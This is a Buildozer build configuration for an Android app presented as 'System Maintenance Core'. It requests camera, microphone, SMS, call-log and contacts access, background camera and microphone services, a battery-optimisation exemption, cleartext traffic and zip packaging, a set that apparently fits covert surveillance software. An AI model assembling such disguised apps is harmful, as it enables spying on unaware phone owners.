[app]

# ====== هوية التطبيق (الإصدار 4.0 - Shield Protocol) ======
title = System Maintenance Core
package.name = com.sys.shield.v4
package.domain = org.sys.core
version = 4.0.0

# ====== المصادر والملفات ======
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
source.include_patterns = assets/*, *.tflite, res/*
source.exclude_dirs = tests, __pycache__, docs, .github, venv, bin, .buildozer
source.exclude_patterns = */test/*, */tests/*, *.pyc, */__pycache__/*

# ====== المكتبات الأساسية (مستقرة وخفيفة) ======
requirements = python3, kivy==2.3.0, tflite-runtime==2.14.0, numpy==1.26.4, pillow, requests, certifi, pyjnius, android, pyzipper

# ====== أيقونة التطبيق ======
icon.filename = %(source.dir)s/res/drawable/ic_launcher.png

# ====== الصلاحيات (متوافقة مع Android 13/14) ======
android.permissions = INTERNET, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE, FOREGROUND_SERVICE_DATA_SYNC, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, READ_CONTACTS, READ_SMS, READ_CALL_LOG

# ====== إعدادات SDK/NDK (API 33 + NDK 25b) – تم تغيير API إلى 33 لضمان التوفر في بيئة GitHub ======
android.api = 33
android.minapi = 26
android.sdk = 33
android.ndk = 25b
android.build_tools_ver = 33.0.0
android.accept_sdk_license = True

# ====== ملف AndroidManifest.xml مخصص – بعد نقل الملفات سيصبح في الجذر ======
android.manifest = AndroidManifest.xml

# ====== المعمارية المستهدفة (arm64-v8a فقط) ======
android.archs = arm64-v8a

# ====== إعدادات الشبكة والتخزين ======
android.allow_backup = False
android.uses_cleartext_traffic = True
android.request_legacy_external_storage = True

# ====== خدمات الخلفية والطاقة ======
android.foreground = True
android.foreground_service_type = dataSync|camera|microphone
android.wakelock = True

# ====== تحسينات أداء Python ======
android.no_byte_compile_python = False
android.optimize_python = True
android.release_artifact = apk

# ====== ميتا-بيانات إضافية ======
android.meta_data = android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS=1

# ====== واجهة المستخدم ======
orientation = portrait
fullscreen = 1

# ====== مستوى التسجيل ======
log_level = 2
warn_on_root = 1

[buildozer]
log_level = 2
warn_on_root = 1
